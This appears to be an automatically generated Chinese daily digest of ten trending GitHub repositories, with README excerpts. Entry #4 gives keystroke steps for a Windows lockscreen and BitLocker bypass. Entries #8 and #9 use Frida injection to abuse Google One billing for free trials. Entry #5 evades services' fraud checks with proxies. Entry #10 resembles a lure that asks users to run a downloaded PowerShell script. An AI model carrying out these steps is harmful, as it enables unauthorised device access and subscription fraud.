📊 开源日报 — 2026-11-21
共发现 10 个新项目（已自动过滤历史记录）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#1  simplexai-labs/linger
    ⭐ 3057 stars  |  🍴 281 forks  |  💻 TypeScript  |  📅 2026-11-10
    🔗 https://github.com/simplexai-labs/linger
    📡 来源: 🚀 两周800+星
    🏷️ agent-teams, local-llm, memory, personal-agent, proactive-agent, proactive-ai
    📝 Linger is An Open-Source Personal Agent That Runs Fully on Your PC.  We aim to break Big Tech’s grip on AI by bringing powerful local AI to everyday computers through efficient model–harness co-design, so everyone can run their own.

    README 摘要:
    Linger is an open-source personal agent with a Claude-class brain running locally on your PC.
    
      Open-Source&nbsp;&nbsp;·&nbsp;&nbsp;Local AI&nbsp;&nbsp;·&nbsp;&nbsp;Consumer Macs &amp; PCs
    
      
      
      
    
      
      
      
      
    
    - **A Claude-class brain, running locally.** A 125B model on a 12 GB GPU, on everyday Macs and PCs.
    - **The Grok Bot experience on your PC.** Zero token fees for local inference.
    - **A loyal AI sidekick.** It remembers what matters, proactively gets things done, and keeps your data on your device.
    
    ## Cool features
    
    ### Local models: A Claude-class brain on a 12 GB GPU
    
    Efficient AI model–harness co-design brings a full local agent to consumer Macs and PCs. Our MoE inference engine, PolyStrata, keeps a model's busiest experts on your GPU and the rest in RAM or on SSD, so larger models run with less GPU memory: the **125B** Qwen3.8-Flash-Next runs on a **12 GB card** with 64 GB of RAM. The model runs on your own machine instead of a remote server, so there is no cloud bill and no token fee.
    
    Speed: how fast seven MoE models write on 8, 12 and 32 GB GPUs
    
      
        Writing, tokens per second
        Laptop RTX 40708 GB
        RTX 306012 GB
        RTX 509032 GB
      
      Qwen3.8-Flash-Next38.1 (Q2_0)¹45.5179
      LFM2.5-24B-A2B70–7397.8480–485
      Flint 40B-A2.5B61–6365.5251–252
      Qwen3.6-35B-A3B94–10091.8394–395
      Ornith 1.576–8280–82316–319
      Gemma 4 26B-A4B92–9378.0 (Q4 file)353–356
      Tiel Coder 35B-A3B8378.8337–345
    
    ¹ Not from PolyStrata's results: our lab measured the Q2_0 file with a short prompt on a 96 GB card held to an 8 GB budget, with 32 GB of RAM and a 64K context. It is not a real 8 GB card, and it does not settle the earlier 95 tok/s IQ1_M figure: Flash-Next Coder IQ1_M gave 32.1 under the same conditions, and the full-model UD-IQ1_M was not tested.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#2  iamajmeena/neonclipping
    ⭐ 1390 stars  |  🍴 66 forks  |  💻 Python  |  📅 2026-11-19
    🔗 https://github.com/iamajmeena/neonclipping
    📡 来源: 🚀 5天300+星
    🏷️ clipping, ffmpeg, shorts, video, whisper, yt-dlp
    📝 Paste a link, get captioned 9:16 clips in ~2 min. Free, local, open-source clipping engine (audio-first, YouTube captions, local LLM).

    README 摘要:
    # NeonClipping
    
    **Paste a link. Get captioned 9:16 clips in about two minutes. Free, local, open-source.**
    
    NeonClipping turns long YouTube / Twitch / Kick videos (or your own MP4) into vertical, captioned clips with a title and hook for each. Everything runs on your machine: no account, no subscription, no upload.
    
     
    
    🌐 **Website with one-click Windows setup:** 
    
    **Made by Ajay K Meena** (Director, DOP, colorist, DaVinci Resolve educator, Jaipur). If NeonClipping saves you time, please ⭐ star the repo and follow @iamajmeena on Instagram.
    
    📘 **Guides (Hindi + English, PDF):** docs/NeonClipping-Guide-EN-HI.pdf  
    🤖 **Let an AI agent install it for you:** copy docs/NEONCLIPPING-AGENT-SETUP-PROMPT.txt into Claude Code, Codex CLI or Cursor.
    
    ## How it finds good moments
    
    Two modes, one button.
    
    **⚡ Fast mode (default, videos over 10 min)** copies the trick that makes the fastest clippers fast: never look at the whole video.
    
    1. Download **audio only** (79 MB for an 85-minute video, about 10 s).
    2. Take the transcript for free from YouTube's own captions (word-timed). No speech model needed. For other sources a local Whisper model is used as the fallback.
    3. Score the whole audio track for *sudden loudness jumps* (vs a 2-minute local baseline), *raised voices* (2–4 kHz energy) and quiet-to-loud transitions.
    4. Take the best moments, read each one's transcript with a local LLM (Ollama) and let it score the moment, write a title and a hook. Snap the start and end to sentence boundaries inside your Min/Max length.
    5. Download **only the chosen sections** of the video (not the whole file), trim exactly by matching their sound to the audio track, and render 1080x1920 clips with burned-in captions.
    
    **🔬 Deep mode** downloads the whole video, adds optical-flow motion (OpenCV Farneback: fast objects, impacts, camera whips) and cut density to the audio signals, shortlists 4× more candidates and gives the LLM 15 seconds of context before and after each one.
    
    Measured on one machine (RTX 2060, 16 threads), Fast mode, 3 clips each:
    
    | Source | Time |
    |---|---|
    | 85-minute YouTube stream (YouTube captions) | **97 s** |
    | 3-hour Twitch VOD (no captions, local speech model) | **136 s** |
    | 90-second YouTube trailer | 21 s |
    | 90-second local MP4 | 14 s |
    
    Your numbers depend on network and CPU.
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#3  Lemxy/WinRust
    ⭐ 807 stars  |  🍴 40 forks  |  💻 Rust  |  📅 2026-11-17
    🔗 https://github.com/Lemxy/WinRust
    📡 来源: 🚀 5天300+星
    📝 Windows shell replacement in Rust: taskbar, file manager, NTFS search, task manager, disk cleaner. One installer exe.

    README 摘要:
    ﻿
    
    # WinRust
    
    **A Windows shell written in Rust: faster and lighter than the stock one.** Small native programs (no .NET, no Electron) that replace parts of Windows: the taskbar, File Explorer, file search, Task Manager, plus a disk cleaner, a disk map and a photo viewer. One installer puts them in, one button takes them all out.
    
    English | Русский
    
    > **Read this first.** WinRust turns off Windows Search, hides the taskbar and can turn off Explorer as the shell. The exe is not code-signed, so SmartScreen will warn you. A restore point is created before install, but try it on a spare machine or a VM first.
    
    ## Install
    
    1. Download `WinRust.exe` from the latest release (Windows 10/11, x64).
    2. Run it as administrator.
    3. Tick the components you want and press the install button. On a fresh install, `rust-explorer` is unchecked. Tick it to replace the Windows Explorer shell (or use the gear on the topbar row: the **Shell: rust-explorer** switch). They are installed in the right order; one that fails or is skipped does not stop the others, the window lists what went wrong.
    
    Windows Search is optional: on a stripped Windows (for example a debloated LTSC image without the Windows Search service) that step is skipped with a warning instead of failing the install.
    
    If UAC asks for **another administrator's** password, the per-user settings (startup entries, scheduled tasks, PowerShell profile, search permissions) still go to the user who is signed in, not to the administrator you typed. If the installer cannot tell who that is, it stops before changing anything.
    
    **Update:** download the new `WinRust.exe` from the releases page, run it as administrator and select the components you want to update or install. An existing `rust-explorer` stays selected by default for updates. Your settings and the saved original Windows values stay.
    
    The installer is in English. The **Русский** button in its corner (or "WinRust apps in Русский" in the bar's right-click menu) switches every WinRust program to Russian.
    
    ## Remove
    
    - **Remove all** in the installer window undoes everything: Windows Search, the taskbar, Explorer and the services come back.
    - One plugin at a time: `plugin-launcher uninstall ` (see Command line).
    - **If the screen is left without a taskbar or desktop:** press Ctrl+Alt+Del → Task Manager → Run new task → `explorer.exe`, then run the installer and press Remove all.
    
    On uninstall, `rust-explorer` restores the service startup values and the svchost grouping t

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#4  ⚠️风险  MSNightmare/FastUnlock
    ⚠️ 命中风险词: exploit, 0day, bypass —— 默认归排除区，需人工确认
    ⭐ 609 stars  |  🍴 100 forks  |  💻 None  |  📅 2026-11-19
    🔗 https://github.com/MSNightmare/FastUnlock
    📡 来源: 🚀 5天300+星
    📝 FastUnlock : Windows Narrator LockScreen Bypass 0day Vulnerability

    README 摘要:
    # FastUnlock
    FastUnlock : Windows Narrator LockScreen Bypass 0day Vulnerability
    
    The vulnerability exist in the way how narrator handles UI in a locked account context, succesful exploitation results in bypassing bitlocker and executing code in the context of the lockscreen account "WsiAccount"
    
    It took a total of 5 minutes from finding this to breaching a fully encrypted bitlocker machine with Windows 11 26H2 November Patch installed, an issue caused by total negligence from Microsoft's side... The vulnerability seems to be extremely consistent in every machine I tested it in, in other words, if you know how to control narrator in the background properly or just press the correct combination of buttons, you will get code execution in the target machine as well.
    
    Obviously this needs physical access and at least one account in the machine to be linked to an online account, this breaks the guarantee that a properly secured bitlocker machine cannot be accessed even if the attacker has physical access so hold tight any windows machines until Microsoft patches this.
    
    In the process of giving narrator a new look, Microsoft forgot to make sure that the new UI does not run in the case it was running in the context of a lockscreen user (interestingly it still has the old code that prevents it from spawning the window if it's running as SYSTEM)
    Unlike the previous lockscreen bypass bugs I found in the past (by example ZDI-21-1053), this one is extremely convenient to use, when you click "I forgot my PIN" (or password or whatever), 
    
    As soon as you the Microsoft account window prompts you for an action to reset the account, press Win+U and click on narrator,
    
    The second you enable narrator it will immediately focus on a background window owned by narrator, this exact window will be in the background but you would not be able to see it
    
    As you can see narrator is focused on the "Next" button, to navigate hold the caps key (Do not release) and use arrow keys to navigate, your next objective is obvious, click on the "Math reading settings", in order to click the actual link, you can press CAPS + Enter, this will take you to the next step, the settings window
    
    From now, it's just up to you how you want to to execute code, having focus on settings window allows multiple ways to get code execution in the context of the "WsiAccount" user. For me I prefer navigating to "Bluetooth & Devices" then going for "AutoPlay" then "Removable Drive" and finally "Open folder to view fi

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#5  0xkaka/homeport
    ⭐ 605 stars  |  🍴 105 forks  |  💻 HTML  |  📅 2026-11-17
    🔗 https://github.com/0xkaka/homeport
    📡 来源: 🚀 5天300+星
    📝 无描述

    README 摘要:
    # homeport
    
    **一句话：让 Claude、Google、Stripe 这些网站，在你所有设备上都看到同一个“住宅 IP”。**
    
    很多人用机场节点访问 Claude / Google，节点一会儿日本一会儿美国，IP 来回跳，再加上机场 IP 是机房 IP，很容易触发风控：注册要验证、付款失败、身份认证不过、甚至封号。
    
    homeport 做的事情很简单：把这些“敏感网站”单独挑出来，统一走一条固定的**住宅代理**；其他网站照旧走你的机场，速度不受影响。
    
    > 🛒 **还没有住宅 IP？** 看这篇 👉 便宜静态住宅 IP 购买教程
    
    ---
    
    ## ⚡ 懒人一键版（推荐小白）
    
    打开 👉 **https://0xkaka.github.io/homeport/**
    
    1. 照着服务商后台，填上住宅代理的地址、端口、用户名、密码；
    2. 选你的设备和软件，点「复制」，到软件里粘贴（iPhone 可以直接扫码加节点）；
    3. 打开 `ipv4.webshare.io` 看 IP 对不对。
    
    账号密码只在你自己浏览器里处理，不会上传。下面是详细的手动教程，一键版搞不定再看。
    
    ---
    
    ## 目录
    
    1. 原理（看不懂可以跳过）
    2. 开始前要准备什么
    3. Clash Party（Mac / Windows）
    4. Clash Verge Rev（Windows / Mac）
    5. 安卓：FlClash
    6. 小火箭 Shadowrocket（iPhone / iPad / Mac）
    7. 检查是否成功
    8. Claude Code、终端、Chrome 的额外设置
    9. 常见问题
    10. 哪些网站会走住宅出口
    11. 给维护者：修改规则
    
    ---
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#6  nataphong-lab/Open-Source-Face-Recognition-Ultimate
    ⭐ 514 stars  |  🍴 420 forks  |  💻 Python  |  📅 2026-11-19
    🔗 https://github.com/nataphong-lab/Open-Source-Face-Recognition-Ultimate
    📡 来源: 🚀 5天300+星
    📝 Face Recognition, Face Liveness Detection, Face Anti-Spoofing, Face Detection, Face Landmarks, Face Compare, Face Matching, Face Pose, Face Expression, Face Attributes, Face Templates Extraction, Face Landmarks

    README 摘要:
    # Ultimate Open Source Face Recognition SDK
    
      
    
    Open Source Face Recognition SDK
    
      A Free, Privacy-Focused Face Recognition Solution for Windows and Linux
    
      Built with deep learning technology, featuring face detection, facial landmarks, feature extraction, and face similarity comparison.
    
      Improved Recognition Accuracy Through Further Training and Optimization of
      FacePlugin's Open-Source Face Recognition Model
    
    ---
    
    ## 🚀 Overview
    
    The **Open Source Face Recognition SDK** is a free, privacy-focused solution designed to integrate face recognition capabilities into applications running on Windows and Linux.
    
    Powered by deep learning models, this SDK provides face detection, facial feature extraction, and face similarity comparison through a simple Python interface.
    
    The recognition model has been further trained using FacePlugin's model as a starting point to improve recognition accuracy.
    
    **Privacy is a priority:** All biometric processing takes place locally, allowing applications to operate without sending facial data to external servers.
    
    ### ✨ Key Features
    
    - 🔒 **100% On-Premise Processing:** All face recognition operations run locally. No biometric data needs to leave your device.
    - 🎯 **High Recognition Accuracy:** Uses deep learning models with additional model training and optimization.
    - ⚡ **Real-Time Processing:** Supports efficient face detection and recognition workflows.
    - 🔧 **Easy Integration:** Simple Python APIs for application development.
    - 🌐 **Cross-Platform:** Supports Windows and Linux.
    - 💻 **CPU and GPU Support:** Can operate on CPU-only systems, with optional GPU acceleration where supported.
    - 🆓 **Completely Free:** Open source with no SDK licensing fees.
    
    ### 🎯 Current Capabilities
    
    - Face detection and bounding box extraction.
    - Facial landmark detection.
    - Facial feature embedding generation.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#7  replit/datacat
    ⭐ 471 stars  |  🍴 52 forks  |  💻 TypeScript  |  📅 2026-11-17
    🔗 https://github.com/replit/datacat
    📡 来源: 🚀 5天300+星
    🏷️ alerting, apm, clickhouse, dashboards, logging, metrics, monitoring, observability, opentelemetry, postgresql
    📝 Self-hosted observability: metrics, logs, traces, dashboards and alerts. Stores data in PostgreSQL or ClickHouse. Accepts OpenTelemetry data.

    README 摘要:
    # DataCat
    
    Self-hosted observability: metrics, logs, distributed traces, dashboards, infrastructure
    and alerts in one place. DataCat runs on your infrastructure, stores data in PostgreSQL (or telemetry in
    ClickHouse, if you choose; see docs/SELF_HOSTING.md), and accepts OpenTelemetry and Datadog-compatible agent traffic.
    No hosted account or external service is required.
    
    ## Features
    
    - Metrics explorer, formulas, dashboards and host maps
    - Searchable logs with facets, live tail and trace correlation
    - APM service catalog, trace explorer and waterfall
    - Metric, log and trace monitors with webhook/Slack notifications
    - Organizations, local accounts, single-use invites, API/application keys
    - OpenTelemetry Collector-based host agent and Node.js/Python instrumentation libraries
    - One production process serving the API, web UI, installer and downloads
    
    ## Quick start with Docker Compose
    
    Requirements: Docker Engine with the Compose plugin, Git, and OpenSSL.
    
    ```sh
    git clone https://github.com/replit/datacat
    cd datacat
    cp .env.example .env
    sed -i "s/^POSTGRES_PASSWORD=.*/POSTGRES_PASSWORD=$(openssl rand -hex 24)/" .env
    sed -i "s/^SESSION_SECRET=.*/SESSION_SECRET=$(openssl rand -hex 32)/" .env
    chmod 600 .env
    mkdir -p downloads
    docker compose up -d --build
    ```
    
    Open **http://localhost:3000**, create your admin account and organization, then create
    an API key under **Organization Settings**. Setup asks for a setup token, printed in the
    server log (`docker compose logs datacat | grep "setup token"`) unless you set `DATACAT_SETUP_TOKEN`.
    Set `PUBLIC_URL` to your externally reachable HTTPS origin before inviting colleagues or
    installing agents remotely.
    
    Agent binaries and SDK packages are separate release assets. Put them (including
    `SHA256SUMS`) in `downloads/` to serve them from your instance.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#8  hatsunemiku-ai/google-one-tools
    ⭐ 463 stars  |  🍴 321 forks  |  💻 Python  |  📅 2026-11-20
    🔗 https://github.com/hatsunemiku-ai/google-one-tools
    📡 来源: 🚀 5天300+星
    📝 无描述

    README 摘要:
    # Google One 工具包（MuMu 模拟器 + Frida）
    
    **`g1.30tb`已在大部分区域下架，可以先搞搞3个月打折的Ultra 5X**
    
    通过 Frida 注入模拟器里的 Google One 进程，调用 Play BillingClient：
    **扫描账号可用的全部订阅 offer（免费/付费）**，以及**拉起任意 SKU 的 Play 收银台**（只弹出，不自动订阅）。
    
    ---
    
    ## 文件清单
    
    | 文件 | 用途 |
    |---|---|
    | `ultra0_core.py` | 自包含核心（adb/frida-server/计费模块/注入模板，从原 ultra0.py 抽取） |
    | `extract_core.py` | 生成器：从原版 ultra0.py 重新抽取 ultra0_core.py（仅维护时用） |
    | `one_common.py` | 公共环境准备（选设备/root/frida-server/计费模块/Play 商店保活），所有脚本共用 |
    | `launch_checkout.py` + `launch_checkout.js` | **拉起任意 SKU 收银台**（主力脚本） |
    | `scan_all.py` | 全量扫描 70 个候选 SKU 的所有 offer（免费+付费+token），零风险 |
    | `query_sku.py` | 只查指定几个 SKU，零风险 |
    | `probe_env.py` | 环境诊断（frida 版本 / Java 桥 / Play 商店状态），出问题先跑它 |
    | `scan_everything.py` + `scan_offers.js` | 穷举账号全部 SKU，输出带定价阶段的原始 JSON 并渲染清单 |
    | `render_multi.py` | 合并多地区 JSON，生成 `SKU-清单.md` |
    | `scan_result_*.json` | 各地区扫描原始数据（已脱敏：serial 已掩码、token 已置空） |
    | `SKU-清单.md` | 多地区金额对照 + 人民币比价清单 |
    
    > 整个文件夹**自包含、无外部依赖**：把 `google-one-tools` 拷到任何机器（装有
    > Python3.9+ 和 frida 16.x）都能直接跑，不需要原版仓库里的脚本。
    
    ## 环境要求（缺一不可）
    
    1. **本机 frida 必须 16.x**（推荐 16.7.19）：
       ```powershell
       py -m pip install frida==16.7.19
       ```
       > ⚠️ frida 17.x 在 MuMu（Android 12 / x86_64）上 Java 桥损坏（`Java is not defined`），
       > 所有功能静默失效。设备上的 frida-server 也必须同版本（脚本会自动下载匹配版）。
    2. **自包含核心**：所有对原版 `ultra0.py` 的依赖已抽取进 `ultra0_core.py`，
       本文件夹可整体拷贝到别处使用；要更新抽取范围，改 `extract_core.py` 后重跑 `py extract_core.py`。
    3. 模拟器已 root、已登录 Google 账号、装有 Google One 和 Play 商店。
    4. 用 `py` 而不是 `python`（本机的 `python` 是商店占位符，跑不了）。

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#9  duwqijlk/google-trial-tool
    ⭐ 371 stars  |  🍴 161 forks  |  💻 JavaScript  |  📅 2026-11-19
    🔗 https://github.com/duwqijlk/google-trial-tool
    📡 来源: 🚀 5天300+星
    📝 无描述

    README 摘要:
    # Google AI Trial Tool
    
    内容为转载，来自q群797481450
    这次的会封号 ，涉及工具调用，慎用
    
    通过 Frida 注入 Google One 进程调用 BillingClient API，发现并激活隐藏的 $0 免费试用。
    
    ## 前提条件
    
    | 组件 | 说明 |
    |---|---|
    | **MuMu 模拟器** | 已启动，已登录 Google 账号，已绑定付款方式 |
    | **adb** | 在 PATH 中，或设置 `ADB_PATH` 环境变量 |
    | **frida** (host) | `pip install frida-tools`，版本 ≥ 16 |
    | **frida-server** (device) | 推送到设备 `/data/local/tmp/frida-server` 并赋予执行权限 |
    | **module.apk** (device) | 包含 BillingClient 库的 APK，推送到 `/data/local/tmp/module.apk` |
    | **Google One** | 设备上已安装 (`com.google.android.apps.subscriptions.red`) |
    
    ## 设备准备
    
    ```bash
    # 连接 MuMu
    adb connect 127.0.0.1:16384
    
    # 推送 frida-server（从 https://github.com/frida/frida/releases 下载对应架构）
    adb push frida-server /data/local/tmp/frida-server
    adb shell "chmod 755 /data/local/tmp/frida-server"
    
    # 推送 module.apk（包含 com.android.billingclient 的 APK）
    adb push module.apk /data/local/tmp/module.apk
    ```
    
    ## 用法
    
    ```bash
    # 列出当前账号所有可用试用
    ./auto-trial.sh --list
    
    # 激活 Pro (5TB, $19.99/mo) 3个月免费试用
    ./auto-trial.sh --product pro --dur 3mo

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#10  jollykit/gta-6-localization-reference-glossary
    ⭐ 150 stars  |  🍴 0 forks  |  💻 Rust  |  📅 2026-11-19
    🔗 https://github.com/jollykit/gta-6-localization-reference-glossary
    📡 来源: 🌍 本地化/多语言 | 新建 | localization i18n transl
    🏷️ documentation, glossary, i18n, l10n, localization, multilingual, reference, terminology, translation
    📝 Terminology reference for GTA 6 localization, compiled from public sources.

    README 摘要:
    # Gta 6 Localization Reference Glossary — Deep Dive
    
    ### 🖥️ PowerShell Setup
    
      
    
    Show your support
    ETH:&nbsp;0x501DA0ad3aF5A9118d5a79Cb90BD8129b8655538
    
    ---
    
    The Gta 6 Localization Reference Glossary serves as a working reference for translators, editors, and reviewers handling in-game content, documenting recurring terms and their approved translations across supported languages. It is compiled from glossary material intended to keep terminology consistent in dialogue, missions, and interface text, and it flags the cases where a direct translation would misrepresent the original meaning. This guide is honest about its limits: entries reflect the current state of the source material and may lag behind late changes or omit context that only appears in the shipped game. Readers should treat the glossary as a starting point for their own review rather than a final authority on every string.
    
    ## 📋 System Requirements
    
    - **OS:** Windows 10 / 11
    - **Shell:** PowerShell 5.1+ or PowerShell 7+
    - **Network:** internet access to download the script
    - **Privileges:** standard user
    
    ## How It Works
    
    This glossary operates as a structured, version-controlled reference rather than a translation tool. Each entry pairs a source term from the game with its localized equivalents across supported languages, alongside contextual notes that explain why a given rendering was chosen. Terms are organized by domain—mission names, fictional brands, character titles, UI strings, and in-world signage—so that translators and modders can locate related vocabulary without scanning an alphabetical list.
    
    The underlying data is kept in plain-text, diff-friendly files. Every entry carries metadata: a stable identifier, the source language string, one or more target-language strings, part of speech, a short definition, and optional usage examples drawn from promotional material or official communications. Where a term is ambiguous or has no confirmed official translation, the entry is flagged accordingly rather than filled with speculative content. This distinction between confirmed, inferred, and unresolved terms is deliberate; the glossary does not present guesses as facts.
    
    Entries are cross-referenced through shared tags and identifiers, allowing a term used in multiple contexts—such as a recurring brand name that appears in radio ads and on billboards—to be traced to a single canonical record. When official localization sources update or correct a prior rendering, the change is recor
